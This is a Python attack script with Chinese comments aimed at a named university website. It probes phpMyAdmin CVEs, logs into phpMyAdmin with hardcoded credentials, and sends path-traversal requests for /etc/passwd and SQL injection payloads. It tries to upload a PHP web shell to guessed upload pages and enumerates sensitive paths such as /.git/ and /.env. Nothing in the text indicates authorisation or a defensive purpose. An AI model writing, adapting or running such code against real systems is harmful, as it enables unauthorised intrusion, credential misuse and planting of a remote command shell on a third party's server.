#!/usr/bin/env python3
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th"
session = requests.Session()
session.verify = False

print("[*] 检查phpMyAdmin 4.0.2漏洞...")

# 漏洞1: CVE-2013-3238 - 反序列化漏洞
print("[*] CVE-2013-3238 反序列化漏洞...")
pma_url = f"{url}/phpmyadmin/"
poc = "index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd"
resp = requests.get(pma_url + poc, verify=False, timeout=5)
if "root:" in resp.text:
    print("[+] 存在CVE-2013-3238漏洞")

# 漏洞2: CVE-2012-5159 - SQL注入
print("[*] CVE-2012-5159 SQL注入...")
pma_session = requests.Session()
pma_session.verify = False
login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = pma_session.post(pma_url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text)
if token:
    token = token.group(1)
    # SQL注入测试
    sql_inj = "index.php?db=mysql&token=" + token + "&sql_query=SELECT+1+UNION+SELECT+2--"
    resp2 = pma_session.get(pma_url + sql_inj, verify=False)
    if "error" not in resp2.text.lower() or "syntax" not in resp2.text.lower():
        print("[+] 可能存在SQL注入")

# 漏洞3: 文件包含/路径遍历
print("[*] 路径遍历测试...")
paths = [
    "index.php?target=../../../../../../etc/passwd",
    "index.php?target=db_sql.php%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "server_databases.php?token=test&target=../../../../etc/passwd",
]
for path in paths:
    resp = requests.get(pma_url + path, verify=False, timeout=5)
    if "root:" in resp.text:
        print(f"[+] 路径遍历成功: {path}")

print("\n[*] 检查主站漏洞...")

# 主站SQL注入测试
print("[*] 主站SQL注入测试...")
main_paths = [
    "/",
    "/index.php",
    "/portal/",
    "/banpot/",
]

for path in main_paths:
    test_url = url + path
    # SQL注入payload
    sqli_payloads = [
        "?id=1' AND 1=1--",
        "?id=1' AND 1=2--",
        "?page=1' UNION SELECT 1,2,3--",
    ]
    for payload in sqli_payloads:
        resp = requests.get(test_url + payload, verify=False, timeout=5)
        if "error" in resp.text.lower() and ("mysql" in resp.text.lower() or "sql" in resp.text.lower()):
            print(f"[+] 可能存在SQL注入: {test_url}{payload}")

# 文件上传测试
print("[*] 文件上传测试...")
upload_paths = [
    "/upload.php",
    "/upload/",
    "/fileupload.php",
    "/admin/upload.php",
]

for up_path in upload_paths:
    test_url = url + up_path
    resp = requests.get(test_url, verify=False, timeout=5)
    if resp.status_code == 200 and ("upload" in resp.text.lower() or "file" in resp.text.lower()):
        print(f"[+] 发现上传入口: {test_url}")
        
        # 尝试上传
        files = {"file": ("shell.php", "<?php system($_GET['c']); ?>", "application/x-php")}
        data = {}
        resp2 = requests.post(test_url, files=files, data=data, verify=False, timeout=5)
        if resp2.status_code == 200:
            print(f"[+] 上传尝试完成，检查响应...")

# 目录遍历
print("[*] 目录遍历测试...")
dir_traversal = [
    "/?file=../../../../etc/passwd",
    "/index.php?page=../../../../etc/passwd",
    "/portal/?file=../../../../etc/passwd",
]

for dt in dir_traversal:
    resp = requests.get(url + dt, verify=False, timeout=5)
    if "root:" in resp.text:
        print(f"[+] 目录遍历成功: {dt}")

# 查找其他入口点
print("\n[*] 查找其他入口点...")
common_paths = [
    "/admin/",
    "/administrator/",
    "/wp-admin/",
    "/phpmyadmin/",
    "/pma/",
    "/mysql/",
    "/db/",
    "/backup/",
    "/old/",
    "/test/",
    "/dev/",
    "/api/",
    "/rest/",
    "/swagger/",
    "/.git/",
    "/.env",
    "/config.php",
    "/database.php",
    "/phpinfo.php",
]

for path in common_paths:
    test_url = url + path
    try:
        resp = requests.get(test_url, verify=False, timeout=3, allow_redirects=False)
        if resp.status_code in [200, 301, 302, 403]:
            print(f"[+] 发现入口: {test_url} [{resp.status_code}]")
            if resp.status_code == 200 and len(resp.text) > 100:
                # 检查是否包含敏感信息
                if "password" in resp.text.lower() or "database" in resp.text.lower() or "<?php" in resp.text:
                    print(f"    [!] 可能包含敏感信息")
    except:
        pass

print("\n[*] 检查robots.txt和sitemap...")
for path in ["/robots.txt", "/sitemap.xml"]:
    resp = requests.get(url + path, verify=False, timeout=5)
    if resp.status_code == 200:
        print(f"[+] {path} 存在")
        print(resp.text[:500])
